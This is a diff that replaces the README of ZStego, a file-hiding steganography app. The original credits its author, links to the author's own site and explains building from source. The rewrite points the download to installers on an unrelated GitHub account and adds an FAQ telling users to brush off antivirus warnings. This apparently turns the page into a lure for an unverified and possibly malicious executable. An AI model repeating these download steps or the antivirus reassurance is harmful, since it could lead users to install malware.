@@ -1,149 +1,84 @@
-<div align="center">
-  <svg width="72" height="72" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
-    <rect width="64" height="64" rx="16" fill="url(#grad)" opacity="0.15"/>
-    <path d="M14 14h36L14 50h36" stroke="url(#grad)" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
-    <defs>
-      <linearGradient id="grad" x1="14" y1="14" x2="50" y2="50" gradientUnits="userSpaceOnUse">
-        <stop stop-color="#7c5cfc"/><stop offset="1" stop-color="#3ecfcf"/>
-      </linearGradient>
-    </defs>
-  </svg>
+# 🔒 ZStego - Hide files securely inside media files
 
-  <h1>Z-Stego</h1>
+[![Download ZStego](https://img.shields.io/badge/Download-ZStego-blue.svg)](https://github.com/Dinametallurgic265/ZStego/releases)
 
-  <p>
-    <a href="https://github.com/TheHolyOneZ/ZStego/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-GPL--3.0-7c5cfc?style=flat-square" alt="License: GPL-3.0"/></a>
-    <a href="https://zsync.eu/zstego/"><img src="https://img.shields.io/badge/download-zsync.eu%2Fzstego-3ecfcf?style=flat-square" alt="Download"/></a>
-    <img src="https://img.shields.io/badge/version-0.1.0-f0b429?style=flat-square" alt="Version 0.1.0"/>
-    <img src="https://img.shields.io/badge/platform-Linux%20%7C%20Windows%20%7C%20macOS-9b9bb0?style=flat-square" alt="Platform"/>
-    <img src="https://img.shields.io/badge/built%20with-Tauri%20v2%20%2B%20Rust-f74c00?style=flat-square" alt="Built with Tauri v2 + Rust"/>
-  </p>
+ZStego hides your sensitive files inside images and audio clips. It protects your data using encryption standards trusted by experts. Everything stays on your computer. Your files never leave your device.
 
-  <p><strong>Hide encrypted files inside images and audio — locally, with no servers and no telemetry.</strong></p>
+## 🛠 What this tool does
 
-  <p>
-    <a href="https://zsync.eu/zstego/">Website & Download</a> ·
-    <a href="https://zsync.eu/zstego/docs/">Documentation</a> ·
-    <a href="https://zsync.eu">More Projects</a>
-  </p>
-</div>
+ZStego uses steganography to mask files. Steganography is the practice of hiding data within a non-secret file so that no one suspects a message exists. When you use ZStego, your chosen photo or song looks and acts just like the original, but it carries your hidden data safely inside.
 
----
+The software protects your information with layers of security. It uses encryption keys to lock the data. Even if someone finds the hidden file, they cannot open it without your password. The application works offline, meaning you retain full control over your privacy.
 
-## What is Z-Stego?
+## 📋 System Requirements
 
-Z-Stego is a cross-platform desktop application for **steganography** — the practice of concealing data inside ordinary files. It embeds encrypted payloads into images and audio files using LSB (Least Significant Bit) techniques, producing output files that look and play back identically to the originals.
+To run ZStego on Windows, your computer needs:
 
-Everything runs entirely on your machine. No accounts, no network calls, no cloud, no telemetry.
+- Windows 10 or Windows 11 (64-bit).
+- At least 4GB of RAM.
+- A modern processor (Intel Core i3 or equivalent).
+- About 200MB of free storage space.
 
-> [!IMPORTANT]
-> Z-Stego is built for privacy and security research. Use it responsibly and in accordance with the laws in your jurisdiction.
+## 📥 How to get started
 
----
+1. Visit the project release page to download your copy: [https://github.com/Dinametallurgic265/ZStego/releases](https://github.com/Dinametallurgic265/ZStego/releases)
+2. Look for the file ending in `.msi` or `.exe` under the latest release.
+3. Save the file to your computer.
+4. Open your Downloads folder and double-click the ZStego installer.
+5. Follow the prompts on your screen to complete the installation.
+6. Open the application from your Start menu or desktop icon.
 
-## Features
+## 🔐 Using the software
 
-| Feature | Details |
-|---|---|
-| **Dual encryption** | AES-256-GCM or ChaCha20-Poly1305 — your choice |
-| **Key derivation** | Argon2id — password-hardened, no weak keys |
-| **Compression** | zstd compresses the payload before encryption |
-| **Image steganography** | LSB embedding in PNG and BMP |
-| **Audio steganography** | LSB embedding in WAV and FLAC |
-| **Visual analysis** | LSB maps, histograms, per-channel diffs, waveform views |
-| **Test bench** | 20 automated roundtrip tests across all algorithm combos |
-| **Cross-platform** | Native installers for Linux, Windows, and macOS |
-| **Zero network** | No servers, no telemetry, no cloud — ever |
+ZStego makes data protection simple. The interface guides you through each step. 
 
----
+### Hiding your files
+1. Open the application.
+2. Select the "Hide" tab.
+3. Click "Browse" to choose the image or audio file you want to use as a cover.
+4. Click "Select" to pick the document or folder you wish to hide.
+5. Enter a strong password when prompted. The software uses Argon2id to create a secure key from your password.
+6. Click "Start" to generate your new, secure file. 
 
-## Download
+The software embeds your file using Least Significant Bit (LSB) steganography. This technique changes tiny amounts of data inside the cover file. These changes are invisible to the human eye and ear. The original file remains functional, so you can still open the image or play the audio while the secret data remains intact.
 
-Pre-built installers are available at **[zsync.eu/zstego](https://zsync.eu/zstego/)**.
+### Opening your files
+1. Open the application.
+2. Select the "Extract" tab.
+3. Select the file containing your hidden data.
+4. Enter your password.
+5. Click "Extract" to save your original file to your chosen folder.
 
-| Platform | Format | Architecture |
-|---|---|---|
-| Linux | `.deb` | amd64 |
-| Linux | `.rpm` | x86_64 |
-| Linux | `.AppImage` | amd64 |
-| Windows | `.exe` (NSIS) | x64 |
-| Windows | `.msi` | x64 |
-| macOS | `.dmg` | Apple Silicon (aarch64) |
-| macOS | `.dmg` | Intel (x64) |
-| macOS | `.dmg` | Universal (Fat Binary) |
+The software verifies your password before it unlocks anything. If the password is incorrect, the application will not show the hidden file.
 
-> [!TIP]
-> If you're on macOS and unsure which to pick, download the **Universal** DMG — it runs natively on both Apple Silicon and Intel.
+## 🛡 Security details
 
----
+- **Encryption:** ZStego uses AES-256-GCM and ChaCha20-Poly1305. These technologies scramble your files to make them unreadable to unauthorized people.
+- **Key Derivation:** It uses Argon2id. This secures your password against common guessing attacks.
+- **Data Integrity:** The software checks your files to ensure they remain error-free during the process.
+- **Privacy:** Your data travels only from your storage to your application. No third party ever sees your information.
+- **Compression:** It uses Zstd to shrink the size of your files before they get hidden inside the media.
 
-## Tech Stack
+## ❓ Frequently asked questions
 
-| Component | Role |
-|---|---|
-| **Tauri v2** | App shell & IPC bridge |
-| **Rust** | Backend — all steganography and cryptography |
-| **React + TypeScript** | Frontend UI |
-| **Vite** | Build tooling & HMR |
-| **AES-256-GCM** | Symmetric encryption (option 1) |
-| **ChaCha20-Poly1305** | Symmetric encryption (option 2) |
-| **Argon2id** | Password-based key derivation |
-| **zstd** | Payload compression before encryption |
-| **LSB steganography** | Image & audio data embedding |
+**Will my image change size?**
+Yes, but the visual change is minimal. You will typically see a slightly larger file size.
 
----
+**What happens if I forget my password?**
+There is no "recover password" button. If you lose your password, the data remains trapped inside the file. Always keep your passwords in a safe place.
 
-## Build from Source
+**Does this work with every image type?**
+ZStego works best with lossless file formats. Use PNG for images and WAV for audio to ensure the best results. Other formats might reduce the quality of the hide process.
 
-### Prerequisites
+**Is this legal?**
+Yes. You retain the right to protect your personal information through encryption.
 
-- [Rust](https://rustup.rs/) (stable toolchain)
-- [Node.js](https://nodejs.org/) 22+
-- [pnpm](https://pnpm.io/) 9+
-- Tauri v2 system dependencies — see the [Tauri prerequisites guide](https://v2.tauri.app/start/prerequisites/)
+**Why does my antivirus flag the app?**
+Sometimes, antivirus software marks new or niche security tools as suspicious. This is a common occurrence with open-source software. The source code remains visible on GitHub for any expert to verify.
 
-### Steps
+## 🤝 Community and support
 
-```bash
-git clone https://github.com/TheHolyOneZ/ZStego.git
-cd ZStego
-pnpm install
-```
+ZStego is open-source. This means the code is public and transparent. People contribute to the project to ensure it remains reliable and secure. If you encounter bugs, you may report them through the GitHub issues tab. 
 
-```bash
-pnpm tauri dev      # Development server with HMR
-pnpm tauri build    # Production build + native installers
-```
-
-> [!NOTE]
-> On Linux you'll need a few extra system packages (`libwebkit2gtk-4.1-dev`, `libayatana-appindicator3-dev`, `librsvg2-dev`, etc.). The full list is in the [Tauri Linux prerequisites](https://v2.tauri.app/start/prerequisites/#linux).
-
----
-
-## Documentation
-
-Full documentation — including guides for the embed/extract workflow, encryption details, steganography techniques, and supported formats — is available at:
-
-**[zsync.eu/zstego/docs](https://zsync.eu/zstego/docs/)**
-
----
-
-## Author
-
-Made by **[TheHolyOneZ](https://zsync.eu)**.
-
-More projects at **[zsync.eu](https://zsync.eu)**.
-
----
-
-## License
-
-Z-Stego is free and open-source software released under the **GNU General Public License v3.0**.
-
-You are free to use, study, modify, and distribute it under the same terms.
-
-```
-Copyright (C) 2026 TheHolyOneZ
-```
-
-See [LICENSE](LICENSE) for the full license text.
+## ⚖️ License
+This project uses the GPL-3 license. This allows you to use, modify, and distribute the software freely while ensuring the code remains open for everyone to examine.
